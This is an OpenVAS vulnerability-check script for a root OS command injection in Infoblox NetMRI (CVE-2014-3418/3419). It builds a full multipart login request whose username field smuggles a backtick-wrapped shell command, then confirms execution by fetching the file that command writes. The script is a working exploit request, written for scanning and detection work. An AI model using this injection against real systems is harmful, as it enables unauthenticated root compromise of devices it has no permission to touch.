###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netmri_os_cmd_injec_07_14.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Infoblox NetMRI OS Command Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:infoblox:netmri";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105061");
  script_cve_id("CVE-2014-3418", "CVE-2014-3419");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13994 $");
  script_name("Infoblox NetMRI OS Command Injection Vulnerability");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127409/Infoblox-6.8.4.x-OS-Command-Injection.html");
  script_xref(name:"URL", value:"http://www.infoblox.com/");

  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2014-07-15 14:33:34 +0200 (Tue, 15 Jul 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_netmri_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("netMRI/detected");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary code as root.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP POST request and check the response.");

  script_tag(name:"solution", value:"Update to Infoblox NetMRI >= 6.8.5.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Infoblox NetMRI is prone to a OS Command Injection Vulnerability.");

  script_tag(name:"affected", value:"Infoblox NetMRI versions 6.4.X.X-6.8.4.X are vulnerable. Other versions may also be affected.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

useragent = http_get_user_agent();
host = http_host_name(port:port);

vtstrings = get_vt_strings();
check = vtstrings["lowercase_rand"];
file  = vtstrings["default"] + '_RCE_Check.txt';
bound = rand();

payload = 'echo ' + check + ' > /var/home/tools/skipjack/app/webui/' + file;

data = '-----------------------------' + bound  + '\r\n' +
      'Content-Disposition: form-data; name="_formStack"\r\n' +
      '\r\n' +
      'netmri/config/userAdmin/login\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="mode"\r\n' +
      '\r\n'  +
      'DO-LOGIN\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="eulaAccepted"\r\n' +
      '\r\n' +
      'Decline\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="TrustToken"\r\n' +
      '\r\n' +
      '\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="skipjackUsername"\r\n' +
      '\r\n' +
      'admin`' + payload + '`\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="skipjackPassword"\r\n' +
      '\r\n' +
      'admin\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="weakPassword"\r\n' +
      '\r\n' +
      'true\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="x"\r\n' +
      '\r\n' +
      '0\r\n' +
      '-----------------------------' + bound + '\r\n' +
      'Content-Disposition: form-data; name="y"\r\n' +
      '\r\n' +
      '0\r\n' +
      '-----------------------------' + bound + '--';

len = strlen( data );

req = 'POST /netmri/config/userAdmin/login.tdf HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Content-Type: multipart/form-data; boundary=---------------------------' + bound + '\r\n' +
      'Content-Length: ' + len + '\r\n' +
      '\r\n' + data;
result = http_send_recv( port:port, data:req, bodyonly:FALSE );

if( ! result || result !~ "^HTTP/1\.[01] 200" )
  exit( 0 );

url = "/webui/" + file;
req1 = http_get( item:url, port:port );
buf = http_send_recv( port:port, data:req1, bodyonly:FALSE );

if( check >< buf ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report, expert_info: 'Request:\n' + req + '\nResponse:\n' + result );
  exit( 0 );
}

exit( 99 );